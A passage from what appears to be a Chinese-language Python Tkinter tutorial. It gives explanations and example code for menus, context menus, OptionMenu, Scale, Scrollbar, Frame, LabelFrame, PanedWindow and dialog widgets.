            OrderedDict([                # 每项对应一个菜单项,后面元组第一个元素是菜单图标,第二个元素是菜单对应的事件处理函数
                ('新建', (None, None)),
                ('打开', (None, None)),
                ('保存', (None, None)),
                ('另存为', (None, None)),
                ('-1', (None, None)),
                ('退出', (None, None)),
            ]),
            OrderedDict([
                ('撤销',(None, None)),
                ('重做',(None, None)),
                ('-1',(None, None)),
                ('剪切',(None, None)),
                ('复制',(None, None)),
                ('粘贴',(None, None)),
                ('删除',(None, None)),
                ('选择',(None, None)),
                ('-2',(None, None)),
                ('更多', OrderedDict([  # 二级菜单
                    ('显示数据',(None, None)),
                    ('显示统计',(None, None)),
                    ('显示图表',(None, None))
                ]))
            ]),
            OrderedDict([
                ('帮助主题',(None, None)),
                ('-1',(None, None)),
                ('关于', (None, None))
            ]))

        menubar = Menu(self.master)                     # 使用Menu创建菜单条
        self.master['menu'] = menubar                   # 为窗口配置菜单条,也就是添加菜单条
        for i, m_title in enumerate(menus):
            m = Menu(menubar, tearoff=0)                # 创建菜单
            menubar.add_cascade(label=m_title, menu=m)  # 添加菜单
            tm = items[i]                               # 将当前正在处理的菜单数据赋值给tm
            for label in tm:                            # 遍历OrderedDict,默认只遍历它的key
                print(label)
                if isinstance(tm[label], OrderedDict):  # 如果value又是OrderedDict,说明是二级菜单
                    sm = Menu(m, tearoff=0)             # 创建子菜单、并添加子菜单
                    m.add_cascade(label=label, menu=sm)
                    sub_dict = tm[label]
                    for sub_label in sub_dict:          # 再次遍历子菜单对应的OrderedDict,默认只遍历它的key
                        if sub_label.startswith('-'):
                            sm.add_separator()          # 添加分隔条
                        else:
                            sm.add_command(label=sub_label,image=sub_dict[sub_label][0],command=sub_dict[sub_label][1], compound=LEFT)
                elif label.startswith('-'):
                    m.add_separator()                   # 添加分隔条
                else:
                    m.add_command(label=label,image=tm[label][0],command=tm[label][1], compound=LEFT) # 添加菜单项

    # 生成所有需要的图标
    def init_icons(self):
        self.master.filenew_icon = PhotoImage(file='images/filenew.png')
        self.master.fileopen_icon = PhotoImage(file='images/fileopen.png')
        self.master.save_icon = PhotoImage(file='images/save.png')
        self.master.saveas_icon = PhotoImage(file='images/saveas.png')
        self.master.signout_icon = PhotoImage(file='images/signout.png')

    # 生成工具条
    def init_toolbar(self):
        toolframe = Frame(self.master, height=20, bg='lightgray')  # 创建并添加一个Frame作为工具条的容器
        toolframe.pack(fill=X)                                     # 该Frame容器放在窗口顶部

        frame = ttk.Frame(toolframe)                               # 再次创建并添加一个Frame作为工具按钮的容器
        frame.pack(side=LEFT)                                      # 该Frame容器放在容器左边

        for i, e in enumerate(dir(self.master)):                   # 遍历self.master的全部数据,根据系统图标来创建工具栏按钮
            if e.endswith('_icon'):                                # 只处理属性名以_icon结尾的属性(这些属性都是图标)
                ttk.Button(frame, width=20, image=getattr(self.master, e),command=None).grid(row=0, column=i, padx=1, pady=1, sticky=E)

root = Tk()
root.title("菜单测试")
root.resizable(width=False, height=True)  # 禁止改变窗口大小
App(root)
root.mainloop()

</textarea><textarea>
import tkinter as tk        # 使用Tkinter前需要先导入
window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

l = tk.Label(window, text='      ', bg='green')
l.pack()

# 定义一个函数功能,用来代表菜单选项的功能,这里为了操作简单,定义的功能比较简单
counter = 0
def do_job():
    global counter
    l.config(text='do '+ str(counter))
    counter += 1

# 创建一个菜单栏,这里可以把他理解成一个容器,在窗口的上方
menubar = tk.Menu(window)

# 创建一个File菜单项(默认不下拉,下拉内容包括New,Open,Save,Exit功能项)
filemenu = tk.Menu(menubar, tearoff=0)
# 将上面定义的空菜单命名为File,放在菜单栏中,就是装入那个容器中
menubar.add_cascade(label='File', menu=filemenu)

# 在File中加入New、Open、Save等小菜单,即我们平时看到的下拉菜单,每一个小菜单对应命令操作。
filemenu.add_command(label='New', command=do_job)
filemenu.add_command(label='Open', command=do_job)
filemenu.add_command(label='Save', command=do_job)
filemenu.add_separator()    # 添加一条分隔线
filemenu.add_command(label='Exit', command=window.quit) # 用tkinter里面自带的quit()函数

# 创建一个Edit菜单项(默认不下拉,下拉内容包括Cut,Copy,Paste功能项)
editmenu = tk.Menu(menubar, tearoff=0)
# 将上面定义的空菜单命名为 Edit,放在菜单栏中,就是装入那个容器中
menubar.add_cascade(label='Edit', menu=editmenu)

# 同样的在Edit中加入Cut、Copy、Paste等小命令功能单元,如果点击这些单元就会触发do_job的功能
editmenu.add_command(label='Cut', command=do_job)
editmenu.add_command(label='Copy', command=do_job)
editmenu.add_command(label='Paste', command=do_job)

# 创建第二级菜单,即菜单项里面的菜单
submenu = tk.Menu(filemenu) # 和上面定义菜单一样,不过此处实在File上创建一个空的菜单
filemenu.add_cascade(label='Import', menu=submenu, underline=0) # 给放入的菜单submenu命名为Import

# 创建第三级菜单命令,即菜单项里面的菜单项里面的菜单命令(有点拗口,笑~~~)
submenu.add_command(label='Submenu_1', command=do_job)   # 这里和上面创建原理也一样,在Import菜单项中加入一个小菜单命令Submenu_1

# 创建菜单栏完成后,配置让菜单栏menubar显示出来
window.config(menu=menubar)

# 主窗口循环显示
window.mainloop()

</textarea><pre>
Menu右键菜单
实现右键菜单很简单,程序只要先创建菜单,然后为目标组件的右键单击事件绑定处理函数,当用户单击鼠标右键时调用菜单的post()方法即可在指定位置弹出右键菜单

</pre><textarea>
from tkinter import *
from tkinter import ttk
from collections import OrderedDict
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.text = Text(self.master, height=12, width=60,foreground='darkgray',font=('微软雅黑', 12),spacing2=8,spacing3=12)
        self.text.pack()
        st = 'C语言中文网成立于 2012 年初,目前已经运营了将近 5 年,我们致力于分享精品教程,帮助对编程感兴趣的读者\n'
        self.text.insert(END, st)
        self.text.bind('<Button-3>',self.popup) # 为text组件的右键单击事件绑定处理方法

        # 创建Menu对象,准备作为右键菜单
        self.popup_menu = Menu(self.master,tearoff = 0)
        self.my_items = (
            OrderedDict([('超大', 16), ('大',14), ('中',12),('小',10), ('超小',8)]),
            OrderedDict([('红色','red'), ('绿色','green'), ('蓝色', 'blue')])
        )
        i = 0
        for k in ['字体大小','颜色']:
            m = Menu(self.popup_menu, tearoff = 0)
            self.popup_menu.add_cascade(label=k ,menu = m) # 添加子菜单
            for im in self.my_items[i]:                    # 遍历OrderedDict的key(默认就是遍历key)
                m.add_command(label=im, command=self.handlerAdaptor(self.choose, x=im))
            i += 1

    def popup(self, event):
        self.popup_menu.post(event.x_root,event.y_root)  #① # 在指定位置显示菜单
    def choose(self, x):
        # 如果用户选择修改字体大小的子菜单项则改变字体大小
        if x in self.my_items[0].keys(): self.text['font'] = ('微软雅黑', self.my_items[0][x]) #
        # 如果用户选择修改颜色的子菜单项则改变颜色
        if x in self.my_items[1].keys(): self.text['foreground'] = self.my_items[1][x]
    def handlerAdaptor(self, fun,**kwds):
        return lambda fun=fun, kwds=kwds: fun(**kwds)
root = Tk()
root.title("右键菜单测试")
App(root)
root.mainloop()

</textarea><pre>
【 Menubutton 】
菜单按钮控件,由于显示菜单项。

【 OptionMenu 】
OptionMenu组件用于构建一个带菜单的按钮,该菜单可以在按钮的四个方向上展开,展开方向可通过direction选项控制。

使用OptionMenu比较简单,直接调用它的如下构造函数即可：
__init__ (self, master, variable, value, *values, **kwargs)

master参数的作用与所有的Tkinker组件一样,指定将该组件放入哪个容器中
variable：指定该按钮上的菜单与哪个变量绑定。
value：指定默认选择菜单中的哪一项。
values：Tkinter将收集为此参数传入的多个值,为每个值创建一个菜单项。
kwargs：用于为OptionMenu配置选项。除前面介绍的常规选项之外,还可通过direction选项控制菜单的展开方向

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.sv = StringVar()
        # 创建一个OptionMenu控件
        self.om = ttk.OptionMenu(root,
            self.sv,        # 绑定变量
            'Python',       # 设置初始选中值
             'Kotlin','Ruby','Swift','Java','Python','JavaScript','Erlang',  # 以下多个值用于设置菜单项
            command = self.print_option) # 绑定事件处理方法,当用户选择菜单中的不同菜单项时都会触发 self.print_option 方法
        self.om.pack()
        # 创建Labelframe容器
        lf = ttk.Labelframe(self.master, padding=20, text='请选择菜单方向')
        lf.pack(fill=BOTH, expand=YES, padx=10, pady=10)
        # 定义代表Labelframe的标题位置的12个常量
        self.directions = ['below', 'above', 'left', 'right', 'flush']
        i = 0
        self.intVar = IntVar()
        # 使用循环创建多个Radiobutton,并放入Labelframe中
        for direct in self.directions:
            Radiobutton(lf, text= direct, value=i, command=self.change, variable=self.intVar).pack(side=LEFT)
            i += 1
        self.intVar.set(9)
    def print_option(self, val):
        print(self.sv.get(), val)  # 通过两种方式来获取OptionMenu选中的菜单项的值
    def change(self):
        self.om['direction'] = self.directions[self.intVar.get()]  # 通过direction选项改变OptionMenu上菜单的展开方向
root = Tk()
root.title("OptionMenu测试")
App(root)
root.mainloop()

</textarea><pre>
【 Scale和LabeledScale 】
范围控件;显示一个数值刻度,为输出限定范围的数字区间
尺度(拉动条),允许通过滑块来设置一数字值。
Scale组件代表一个滑动条,可以为该滑动条设置最小值和最大值,也可以设置滑动条每次调节的步长。

什么时候用：
在需要用户给出评价等级,或者给出一个评价分数,或者拉动滑动条提供一个具体的数值等等。

Scale组件支持如下选项：
from：设置该Scale的最小值。
to：设置该Scale的最大值。
resolution：设置该Scale滑动时的步长。
label：为Scale组件设置标签内容。
length：设置轨道的长度。
width：设置轨道的宽度。
troughcolor：设置轨道的背景色。
sliderlength：设置轨道的长度。
sliderrelief：设置滑块的立体样式。
showvalue：设置是否显示当前值。
orient：设置方向。该选项支持VERTICAL和HORIZONTAL两个值。
digits：设置有效数字至少要有几位。
variable：用于与变量进行绑定。
command：用于为该Scale组件绑定事件处理,函数或方法。

如果使用ttk.Scale组件,则更接近操作系统本地的效果,但允许定制的选项少。

</pre><textarea>
from tkinter import *
root = Tk()
Scale(root, from_=0, to=42).pack()
Scale(root, from_=0, to=200, orient=HORIZONTAL).pack()
mainloop()

</textarea><textarea>
from tkinter import *

root = Tk()
s1 = Scale(root, from_=0, to=42)
s1.pack()
s2 = Scale(root, from_=0, to=200, orient=HORIZONTAL)
s2.pack()

def show():
    print(s1.get(), s2.get())

Button(root, text="获取位置", command=show).pack()

mainloop()

</textarea><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

l = tk.Label(window, bg='green', fg='white', width=20, text='empty')
l.pack()

# 定义一个触发函数功能
def print_selection(v):
    l.config(text='you have selected ' + v)

# 创建一个尺度滑条,长度200字符,从0开始10结束,以2为刻度,精度为0.01,触发调用print_selection函数
s = tk.Scale(window, label='try me', from_=0, to=10, orient=tk.HORIZONTAL, length=200, showvalue=0,tickinterval=2, resolution=0.01, command=print_selection)
s.pack()

window.mainloop()  # 主窗口循环显示

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.scale = Scale(self.master,
            from_ = -100,        # 设置最大值
            to = 100,            # 设置最小值
            resolution = 5,      # 设置步长
            label = '示范Sacle', # 设置标签内容
            length = 400,        # 设置轨道的长度
            width = 30,          # 设置轨道的宽度
            troughcolor='lightblue', # 设置轨道的背景色
            sliderlength=20,     # 设置滑块的长度
            sliderrelief=SUNKEN, # 设置滑块的立体样式
            showvalue=YES,       # 设置显示当前值
            orient = HORIZONTAL  #设置水平方向
        )
        self.scale.pack()

        # 创建一个Frame作为容器
        f = Frame(self.master)
        f.pack(fill=X, expand=YES, padx=10)
        Label(f, text='是否显示值:').pack(side=LEFT)
        i = 0
        self.showVar = IntVar()
        self.showVar.set(1)
        # 创建两个Radiobutton控制Scale是否显示值
        for s in ('不显示', '显示'):
            Radiobutton(f, text=s, value=i,variable=self.showVar, command=self.switch_show).pack(side=LEFT)
            i += 1

        # 创建一个Frame作为容器
        f = Frame(self.master)
        f.pack(fill=X, expand=YES, padx=10)
        Label(f, text='方向:').pack(side=LEFT)
        i = 0
        self.orientVar = IntVar()
        self.orientVar.set(0)
        # 创建两个Radiobutton控制Scale的方向
        for s in ('水平', '垂直'):
            Radiobutton(f, text=s, value=i,variable=self.orientVar, command=self.switch_orient).pack(side=LEFT)
            i += 1

    def switch_show(self):
        self.scale['showvalue'] = self.showVar.get()
    def switch_orient(self):
        self.scale['orient'] = VERTICAL if self.orientVar.get() else HORIZONTAL # 根据单选框的选择设置orient选项的值
root = Tk()
root.title("Scale测试")
App(root)
root.mainloop()

</textarea><pre>
Scale组件同样支持variable进行变量绑定,也支持使用command选项绑定事件处理函数或方法,这样每当用户拖动滑动条上的滑块时都会触发command绑定的事件处理方法,不过Scale的事件处理方法比较奇葩,它可以额外定义一个参数用于获取Scale的当前值

通过三种方式来获取Scale组件的值：
1、通过事件处理方法的参数来获取。
2、通过Scale组件提供的get()方法来获取。
3、通过Scale组件绑定的变量来获取。

</pre><textarea>
from tkinter import *
# 导入ttk
from tkinter import ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 定义变量
        self.doubleVar = DoubleVar()
        self.scale = Scale(self.master,
            from_ = -100,             # 设置最大值
            to = 100,                 # 设置最小值
            resolution = 5,           # 设置步长
            label = '示范Sacle',      # 设置标签内容
            length = 400,             # 设置轨道的长度
            width = 30,               # 设置轨道的宽度
            orient = HORIZONTAL,      # 设置水平方向
            digits = 10,              # 设置十位有效数字
            command = self.change,    # 绑定事件处理函数
            variable = self.doubleVar # 绑定变量
        )
        self.scale.pack()
        self.scale.set(20)  # 设置Scale的当前值
    # 这个事件处理函数比较奇葩,它可以接收到Scale的值
    def change(self, value):
        print(value, self.scale.get(), self.doubleVar.get()) # 通过三种方式来获取 Scale 组件的值
root = Tk()
root.title("Scale测试")
App(root)
root.mainloop()

</textarea><pre>
ttk.LabeledScale是平台化的滑动条,因此它允许设置的选项很少,只能设置from、to和compound等有限的几个选项,而且它总是生成一个水平滑动条,不能变成垂直的,其中compound选项控制滑动条的数值标签是显示在滑动条的上方还是滑动条的下方

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.scale = ttk.LabeledScale(self.master,
            from_ = -100,  # 设置最大值
            to = 100,      # 设置最小值
            # compound = BOTTOM # 设置显示数值的Label在下方
        )
        self.scale.value = -20
        self.scale.pack(fill=X, expand=YES)
root = Tk()
root.title("LabeledScale测试")
App(root)
root.mainloop()

</textarea><pre>
【 Scrollbar 】
滚动条控件,当内容超过可视化区域时使用,如listboxes、canvases and text fields,Horizontal scrollbars can also be used with the Entry widget

To connect a vertical scrollbar to such a widget, you have to do two things:
Set the widget's yscrollcommand callbacks to the set method of the scrollbar.
Set the scrollbar's command to the yview method of the widget.

选项：
activebackground：指定当鼠标在上方飘过的时候滑块和箭头的背景颜色,默认值由系统指定
activerelief：指定当鼠标在上方飘过的时候滑块的样式,默认值是RAISED,可以选择FLAT,SUNKEN,GROOVE,RIDGE
background(bg):指定背景颜色,默认值由系统指定
borderwidth(bd):指定边框宽度,默认值是 0
command:当滚动条更新时回调的函数,通常的是指定对应组件的xview()或yview()方法
cursor:指定当鼠标在上方飘过的时候的鼠标样式,默认值由系统指定
elementborderwidth:指定滚动条和箭头的边框宽度,默认值是-1表示使用borderwidth选项的值
highlightbackground:指定当滚动条没有获得焦点的时候高亮边框的颜色,默认值由系统指定
highlightcolor:指定当滚动条获得焦点的时候高亮边框的颜色,默认值由系统指定
highlightthickness:指定高亮边框的宽度,默认值是 0(不带高亮边框)
jump:指定当用户拖拽滚动条时的行为,默认False,滚动条的任何一丝变动都会即刻调用command选项指定的回调函数,设置为True则当用户松开鼠标才调用
orient:指定绘制HORIZONTAL(垂直滚动条)还是VERTICAL(水平滚动条),默认VERTICAL
relief:指定边框样式,默认值是SUNKEN,可以选择FLAT,RAISED,GROOVE,RIDGE
repeatdelay:该选项指定鼠标左键点击滚动条凹槽的响应时间,默认值是 300(毫秒)
repeatinterval:该选项指定鼠标左键紧按滚动条凹槽时的响应间隔,默认值是 100(毫秒)
takefocus:指定使用Tab键可以将焦点移到该Scrollbar组件上,默认是开启的,可以将该选项设置为False避免焦点在此组件上
troughcolor:指定凹槽的颜色,默认值由系统指定
width:指定滚动条的宽度,默认16像素

</pre><textarea>
# 无滚动条
from tkinter import *
root = Tk()
# 创建一个空列表
theLB = Listbox(root, setgrid=True)
theLB.pack()
# 往列表里添加数据
for item in range(11):
    theLB.insert(END, item)
mainloop()

# 带滚动条
from tkinter import *
root = Tk()
sb = Scrollbar(root)
sb.pack(side=RIGHT, fill=Y)
lb = Listbox(root, yscrollcommand=sb.set)
for i in range(1000):
    lb.insert(END, str(i))
lb.pack(side=LEFT, fill=BOTH)
sb.config(command=lb.yview)
mainloop()

</textarea>scrollbar for canvas<textarea>
from tkinter import *
root=Tk()
canvas=Canvas(root,scrollregion=(0,0,0,5000))
vbar=Scrollbar(root,orient=VERTICAL)
vbar.pack(side=RIGHT,fill=Y)
vbar.config(command=canvas.yview)
canvas.config(yscrollcommand=vbar.set)
canvas.pack(side=LEFT,expand=YES,fill=BOTH)
root.mainloop()

from tkinter import *
root=Tk()
frame=Frame(root,width=300,height=300)
frame.grid(row=0,column=0)
canvas=Canvas(frame,bg='#FFFFFF',width=300,height=300,scrollregion=(0,0,500,500))
hbar=Scrollbar(frame,orient=HORIZONTAL)
hbar.pack(side=BOTTOM,fill=X)
hbar.config(command=canvas.xview)
vbar=Scrollbar(frame,orient=VERTICAL)
vbar.pack(side=RIGHT,fill=Y)
vbar.config(command=canvas.yview)
canvas.config(width=300,height=300)
canvas.config(xscrollcommand=hbar.set, yscrollcommand=vbar.set)
canvas.pack(side=LEFT,expand=True,fill=BOTH)
root.mainloop()

</textarea><pre>
方文档说Scrollbar只能与canvas, entry, listbox, text相结合,但如果想让Scrollbar和frame相结合呢？
解决办法是：把frame放在canvas里面(比如填满整个canvas),canvas与scrollbar结合,这样滚动canvas就等于滚动frame了。

</pre><textarea>
canvas=Canvas(root,width=200,height=180,scrollregion=(0,0,520,520)) #创建canvas
canvas.place(x = 75, y = 265) #放置canvas的位置
frame=Frame(canvas) #把frame放在canvas里
frame.place(width=180, height=180) #frame的长宽,和canvas差不多的
vbar=Scrollbar(canvas,orient=VERTICAL) #竖直滚动条
vbar.place(x = 180,width=20,height=180)
vbar.configure(command=canvas.yview)
hbar=Scrollbar(canvas,orient=HORIZONTAL)#水平滚动条
hbar.place(x =0,y=165,width=180,height=20)
hbar.configure(command=canvas.xview)
canvas.config(xscrollcommand=hbar.set,yscrollcommand=vbar.set) #设置
canvas.create_window((90,240), window=frame)  #create_window

</textarea><pre>
【 Frame 】
框架控件;在屏幕上显示一个矩形区域,多用来作为容器
用来承载放置其他GUI元素,就是一个容器,是一个在Windows上分离小区域的部件, 它能将Windows分成不同的区,然后存放不同的其他部件. 同时一个Frame上也能再分成两个Frame,Frame可以认为是一种容器.

什么时候用：
在比如像软件或网页交互界面等,有不同的界面逻辑层级和功能区域划分时可以用到,让交互界面逻辑更加清晰

</pre><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

tk.Label(window, text='on the window', bg='red', font=('Arial', 16)).pack()

# 创建一个主frame,长在主window窗口上
frame = tk.Frame(window)
frame.pack()

# 创建第二层框架frame,长在主框架frame上面
frame_l = tk.Frame(frame)# 第二层frame,左frame,长在主frame上
frame_r = tk.Frame(frame)# 第二层frame,右frame,长在主frame上
frame_l.pack(side='left')
frame_r.pack(side='right')

# 创建三组标签,为第二层frame上面的内容,分为左区域和右区域,用不同颜色标识
tk.Label(frame_l, text='on the frame_l1', bg='green').pack()
tk.Label(frame_l, text='on the frame_l2', bg='green').pack()
tk.Label(frame_l, text='on the frame_l3', bg='green').pack()
tk.Label(frame_r, text='on the frame_r1', bg='yellow').pack()
tk.Label(frame_r, text='on the frame_r2', bg='yellow').pack()
tk.Label(frame_r, text='on the frame_r3', bg='yellow').pack()

window.mainloop()  # 主窗口循环显示

</textarea><pre>
【 LabelFrame 】
Labelframe是Frame容器的改进版,允许为容器添加一个标签,该标签既可以是普通的文字标签,也可以将任意GUI组件作为标签

为了让ttk.Labelframe与tkinter.LabelFrame保持名字上的兼容,ttk为ttk.Labelframe起了一个别名ttk.LabelFrame,因此在程序中既可使用ttk.Labelframe,也可使用ttk.LabelFrame,它们二者完全相同。

Labelframe允许通过如下选项对标签进行定制：
labelwidget：设置可以将任意GUI组件作为标签。
labelanchor：设置标签的位置,该选项支持'e'、's'、'w'、'n'、'es'、'ws'、'en'、'wn'、'ne'、'nw'、'se'、'sw'这12个选项值,用于控制标签的位置。

</pre><textarea>
from tkinter import *

root = Tk()
group = LabelFrame(root, text="最好的脚本语言是？", padx=5, pady=5)
group.pack(padx=10, pady=10)
LANGS = [("Python", 1), ("Per1", 2), ("Ruby", 3), ("Lua", 4)]
v = IntVar()
v.set(1)
for lang, num in LANGS:
    b = Radiobutton(group, text=lang, variable=v, value=num)
    b.pack(anchor=W)

mainloop()

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建Labelframe容器
        lf = ttk.Labelframe(self.master, text='请选择教程', padding=20)
        lf.pack(fill=BOTH, expand=YES, padx=10, pady=10)
        books = ['C++', 'Python', 'Linux', 'Java']
        i = 0
        self.intVar = IntVar()
        # 使用循环创建多个Radiobutton,并放入Labelframe中
        for book in books:
            Radiobutton(lf, text=book + '教程', value=i, variable=self.intVar).pack(side=LEFT)
            i += 1
root = Tk()
root.title("Labelframe测试")
root.iconbitmap('1.ico')  # 改变窗口图标
App(root)
root.mainloop()

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建Labelframe容器
        self.lf = ttk.Labelframe(self.master, padding=20)
        self.lf.pack(fill=BOTH, expand=YES, padx=10, pady=10)
        # 创建一个显示图片的Label
        bm = PhotoImage(file='light.gif')
        lb = Label(self.lf, image=bm)
        lb.bm = bm
        # 将Labelframe的标题设为显示图片的Label
        self.lf['labelwidget'] = lb
        # 定义代表Labelframe的标题位置的12个常量
        self.books = ['e', 's', 'w', 'n', 'es', 'ws', 'en', 'wn', 'ne', 'nw', 'se', 'sw']
        i = 0
        self.intVar = IntVar()
        # 使用循环创建多个Radiobutton,并放入Labelframe中
        for book in self.books:
            Radiobutton(self.lf, text= book, value=i, command=self.change, variable=self.intVar).pack(side=LEFT)
            i += 1
        self.intVar.set(9)
    def change(self):
        self.lf['labelanchor'] = self.books[self.intVar.get()]  # 通过labelanchor选项改变Labelframe的标题的位置
root = Tk()
root.title("Labelframe测试")
App(root)
root.mainloop()

</textarea><pre>
【 PanedWindow 】
Panedwindow是一个管理窗口布局的容器,它允许添加多个子组件,不需要使用Pack、Grid或Place布局,并为每个子组件划分一个区域,用户可用鼠标移动各区域的分隔线来改变各子组件的大小,如果没有显式指定大小子组件总是自动占满整个区域

ttk.Panedwindow继承了tkinter.PanedWindow,为了让ttk.Panedwindow与tkinter.PanedWindow保持名字上的兼容,ttk为ttk.Panedwindow起了一个别名ttk.PanedWindow,因此在程序中既可使用ttk.Panedwindow,也可使用ttk.PanedWindow,它们二者完全相同。

Panedwindow是一个非常有特色的容器,它自带布局管理功能,它允许通过orient选项指定水平或垂直方向,让容器中的各组件按水平或垂直方向排列。

在创建Panedwindow之后,程序可通过如下方法操作Panedwindow容器中的子组件：
add(self, child, **kw)：添加一个子组件。
insert(self, pos, child,**kw)：在pos位置插入一个子组件。
remove(self, child)：删除一个子组件,该子组件所在区域也被删除

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建ttk.Style对象专门用于管理他组件的样式,这样ttk组件即可通过style选项复用ttk.Style管理的样式。此处使用ttk.Style为ttk.Panedwindow指定样式,这样才能看到ttk.Panedwindow容器内的分隔线,默认是看不到的
        style = ttk.Style()
        style.configure("fkit.TPanedwindow", background='darkgray', relief=RAISED)
        # 创建Panedwindow组件,通过style属性配置分隔线
        pwindow = ttk.Panedwindow(self.master, orient=VERTICAL, style="fkit.TPanedwindow")
        pwindow.pack(fill=BOTH, expand=1)
        first = ttk.Label(pwindow, text="第一个标签")
        pwindow.add(first)  # 调用add方法添加组件,每个组件一个区域
        okBn = ttk.Button(pwindow,text="第二个按钮",command=lambda:pwindow.remove(okBn)) # 调用remove()方法删除组件,该组件所在区域消失
        pwindow.add(okBn)   # 调用add方法添加组件,每个组件一个区域
        entry = ttk.Entry(pwindow, width=30)
        pwindow.add(entry)  # 调用add方法添加组件,每个组件一个区域
        pwindow.insert(1, Label(pwindow, text='插入的标签')) # 调用insert方法插入组件
root = Tk()
root.title("Panedwindow测试")
App(root)
root.mainloop()

</textarea>Panedwindow组件可水平和垂直排列组件,同样也是可以嵌套的,以实现功能更丰富的界面<textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建Style
        style = ttk.Style()
        style.configure("fkit.TPanedwindow", background='darkgray', relief=RAISED)
        # 创建Panedwindow组件,通过style属性配置分隔线
        pwindow = ttk.Panedwindow(self.master, orient=HORIZONTAL, style="fkit.TPanedwindow")
        pwindow.pack(fill=BOTH, expand=YES)
        left = ttk.Label(pwindow, text="左边标签", background='pink')
        pwindow.add(left)
        # 创建第二个Panedwindow组件,该组件的方向为垂直方向
        rightwindow = PanedWindow(pwindow, orient=VERTICAL)
        pwindow.add(rightwindow)
        top = Label(rightwindow, text="右上标签", background='lightgreen')
        rightwindow.add(top)
        bottom = Label(rightwindow, text="右下标签", background='lightblue')
        rightwindow.add(bottom)
root = Tk()
root.title("Panedwindow测试")
App(root)
root.mainloop()

</textarea><pre>
【 Toplevel 】
容器控件;用来提供一个单独的对话框,和Frame类似

【 SimpleDialog和Dialog 】
对话框也是图形界面编程中很常用的组件,通常用于向用户生成某种提示信息,或者请求用户输入某些简单的信息。

对话框看上去有点类似于顶级窗口,但对于对话框有如下两点需要注意：
对话框通常依赖其他窗口,因此程序在创建对话框时同样需要指定master属性即该对话框的属主窗口
对话框有非模式(non-modal)和模式(modal)两种,当某个模式对话框被打开之后,该模式对话框总是位于它依赖的窗口之上;在模式对话框被关闭之前,它依赖的窗口无法获得焦点。

Tkinter在simpledialog和dialog模块下分别提供了SimpleDialog类和Dialog类,它们都可作为普通对话框使用,而且用法也差不多。

在使用simpledialog.SimpleDialog创建对话框时,可指定如下选项：
title：指定该对话框的标题。
text：指定该对话框的内容。
button：指定该对话框下方的几个按钮。
default：指定该对话框中默认第几个按钮得到焦点。
cancel：指定当用户通过对话框右上角的X 按钮关闭对话框时,该对话框的返回值。

如果使用dialog.Dialog创建对话框,除可使用master指定对话框的属主窗口之外,还可通过dict来指定如下选项：
title：指定该对话框的标题。
text：指定该对话框的内容。
strings：指定该对话框下方的几个按钮。
default：指定该对话框中默认第几个按钮得到焦点。
bitmap：指定该对话框上的图标。

对话框的左边还显示了一个问号图标,这是Python内置的10个位图之一,可以直接使用,共有如下几个常量可用于设置位图：
"error", "gray75", "gray50", "gray25", "gray12", "howglass", "info", "questhead", "question", "warning"

simpledialog.SimpleDialog和dialog.Dialog所支持的选项大同小异,区别只是dialog.Dialog需要使用dict来传入多个选项。

</pre><textarea>
from tkinter import *
from tkinter import ttk           # 导入ttk
from tkinter import simpledialog  # 导入simpledialog
from tkinter import dialog        # 导入dialog
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.msg = 'C语言中文网成立于 2012 年初,目前已经运营了将近 5 年,我们致力于分享精品教程,帮助对编程感兴趣的读者。'
        ttk.Button(self.master, text='打开SimpleDialog', command=self.open_simpledialog).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='打开Dialog', command=self.open_dialog).pack(side=LEFT, ipadx=5, ipady=5, padx = 10)
    def open_simpledialog(self): # 使用simpledialog.SimpleDialog创建对话框
        d = simpledialog.SimpleDialog(self.master, # 设置该对话框所属的窗口
            title='SimpleDialog测试',              # 标题
            text=self.msg,                         # 内容
            buttons=["是", "否", "取消"],
            cancel=3,
            default=0                              # 设置默认是哪个按钮得到焦点
        )
        print(d.go())  #①,对话框go()方法的返回值会获取用户单击了对话框的哪个按钮。如果用户通过对话框右上角的X按钮关闭对话框则返回cancel选项指定的值
    def open_dialog(self):                    # 使用dialog.Dialog创建对话框
        d = dialog.Dialog(self.master, {      # 设置该对话框所属的窗口
            'title': 'Dialog测试',            # 标题
            'text':self.msg,                  # 内容
            'bitmap': 'question',             # 图标
            'default': 0,                     # 设置默认选中项
            'strings': ('确定','取消','退出')  # strings选项用于设置按钮
        })
        print(d.num)  #②,对话框num属性的值会获取用户单击了对话框的哪个按钮
root = Tk()
root.title("对话框测试")
App(root)
root.mainloop()

</textarea><pre>
自定义对话框(模式和非模式)
